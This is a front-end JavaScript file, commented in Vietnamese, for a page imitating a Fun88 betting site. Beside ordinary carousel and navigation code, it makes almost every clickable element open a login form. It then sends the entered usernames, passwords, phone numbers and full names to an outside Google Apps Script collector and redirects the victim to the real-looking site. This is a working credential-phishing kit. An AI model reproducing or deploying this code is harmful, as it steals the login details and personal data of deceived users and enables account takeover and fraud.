// Đợi cho HTML tải xong mới chạy script
document.addEventListener("DOMContentLoaded", function() {
    
    // ================= 1. XỬ LÝ THANH ĐIỀU HƯỚNG (NAVIGATION) =================
    const navItems = document.querySelectorAll('.bottom-nav .nav-item');
    navItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault(); 
            navItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const topNavItems = document.querySelectorAll('.top-nav li');
    topNavItems.forEach(item => {
        item.addEventListener('click', function() {
            topNavItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // ================= 2. XỬ LÝ BANNER TRƯỢT TỰ ĐỘNG =================
    const bannerWrapper = document.querySelector('.banner-wrapper');
    const dots = document.querySelectorAll('.carousel-dots .dot');
    const totalSlides = dots.length;
    let currentSlide = 0;
    let slideInterval;

    function moveToSlide(index) {
        currentSlide = index;
        if (bannerWrapper) {
            bannerWrapper.style.transform = `translateX(-${currentSlide * 100}%)`;
        }
        dots.forEach(dot => dot.classList.remove('active'));
        if(dots[currentSlide]) dots[currentSlide].classList.add('active');
    }

    function autoSlide() {
        let nextSlide = (currentSlide + 1) % totalSlides;
        moveToSlide(nextSlide);
    }

    function startSlideShow() {
        slideInterval = setInterval(autoSlide, 3000);
    }

    startSlideShow();

    dots.forEach((dot, index) => {
        dot.addEventListener('click', () => {
            clearInterval(slideInterval); 
            moveToSlide(index);
            startSlideShow(); 
        });
    });

    // ================= 3. XỬ LÝ ĐÓNG / MỞ FORM ĐĂNG NHẬP - ĐĂNG KÝ =================
    const loginModal = document.getElementById('login-modal');
    const registerModal = document.getElementById('register-modal');
    const btnLogin = document.querySelector('.btn-login'); 
    const btnRegister = document.querySelector('.btn-register'); 
    const closeBtns = document.querySelectorAll('.close-modal'); 
    const switchToRegister = document.getElementById('switch-to-register'); 

    // Bấm nút "Đăng Nhập" ở header
    if(btnLogin) {
        btnLogin.addEventListener('click', function() {
            loginModal.style.display = 'flex';
        });
    }

    // Bấm nút "Đăng Ký" ở header
    if(btnRegister) {
        btnRegister.addEventListener('click', function() {
            registerModal.style.display = 'flex';
        });
    }

    // Bấm dấu X để đóng form
    closeBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            loginModal.style.display = 'none';
            registerModal.style.display = 'none';
        });
    });

    // Bấm "Đăng ký ngay" ở dưới form Đăng nhập
    if (switchToRegister) {
        switchToRegister.addEventListener('click', function() {
            loginModal.style.display = 'none';
            registerModal.style.display = 'flex';
        });
    }

    // ================= 4. TÁC VỤ BẤM VÀO CÁC THÀNH PHẦN KHÁC -> MỞ FORM ĐĂNG NHẬP =================
    const requireLoginElements = document.querySelectorAll(`
        .top-nav li, 
        .banner-slide, 
        .sports-img, 
        .game-card, 
        .slot-card, 
        .odd-btn, 
        .more, 
        .bottom-nav .nav-item:not(.active)
    `);

    requireLoginElements.forEach(element => {
        element.style.cursor = 'pointer';
        element.addEventListener('click', function(e) {
            e.preventDefault(); 
            if (loginModal) {
                loginModal.style.display = 'flex';
            }
        });
    });

    // ================= 5. KIỂM TRA ĐIỀN ĐỦ THÔNG TIN VÀ ĐẨY LÊN GOOGLE SHEET =================
    function setupFormValidation(modalId) {
        const modal = document.getElementById(modalId);
        if (!modal) return;

        const inputs = modal.querySelectorAll('.form-group input');
        const submitBtn = modal.querySelector('.btn-submit');

        function checkInputs() {
            let allValid = true;

            inputs.forEach(input => {
                let val = input.value.trim();
                let placeholder = input.getAttribute('placeholder');
                let type = input.getAttribute('type');

                if (type === 'password' || placeholder.includes('Tên đăng nhập')) {
                    if (val.length < 6 || val.length > 20) allValid = false;
                } 
                else if (type === 'tel' || placeholder.includes('Số điện thoại')) {
                    const phoneRegex = /^[0-9]{10}$/;
                    if (!phoneRegex.test(val)) allValid = false;
                } 
                else {
                    if (val === '') allValid = false;
                }
            });

            if (allValid && inputs.length > 0) {
                submitBtn.classList.add('active');
            } else {
                submitBtn.classList.remove('active');
            }
        }

        inputs.forEach(input => {
            input.addEventListener('input', checkInputs);
        });

        // Xử lý khi nhấn Submit
        if (submitBtn) {
            submitBtn.addEventListener('click', function(e) {
                e.preventDefault(); 

                if (this.classList.contains('active')) {
                    let originalText = this.innerText;
                    this.innerText = "Đang xử lý...";

                    let formData = {
                        type: modalId === 'login-modal' ? 'Đăng nhập' : 'Đăng ký',
                        username: '',
                        password: '',
                        phone: '',
                        fullname: ''
                    };

                    inputs.forEach(input => {
                        let placeholder = input.getAttribute('placeholder') || '';
                        let val = input.value.trim();
                        if (placeholder.includes('Tên đăng nhập')) formData.username = val;
                        if (placeholder.includes('Mật khẩu')) formData.password = val;
                        if (placeholder.includes('Số điện thoại')) formData.phone = val;
                        if (placeholder.includes('Họ và tên')) formData.fullname = val;
                    });

                    const scriptURL = 'https://script.google.com/macros/s/AKfycby2H3iXsl9SCXBkb4NKCny1HCFL22WFwCpupWnWoAEPAwDbS6_6SwujGMja102cZmULvw/exec';

                    fetch(scriptURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams(formData).toString()
                    })
                    .then(response => {
                        window.location.href = "https://www.fun88va.com/vn/";
                    })
                    .catch(error => {
                        console.error('Lỗi!', error.message);
                        this.innerText = originalText;
                        window.location.href = "https://www.fun88va.com/vn/";
                    });

                } else {
                    alert("Vui lòng điền chính xác các thông tin:\n- Tài khoản & Mật khẩu: 6 - 20 ký tự.\n- Số điện thoại: Đúng 10 số.");
                }
            });
        }
    }

    // Khởi chạy kiểm tra form
    setupFormValidation('login-modal');
    setupFormValidation('register-modal');

});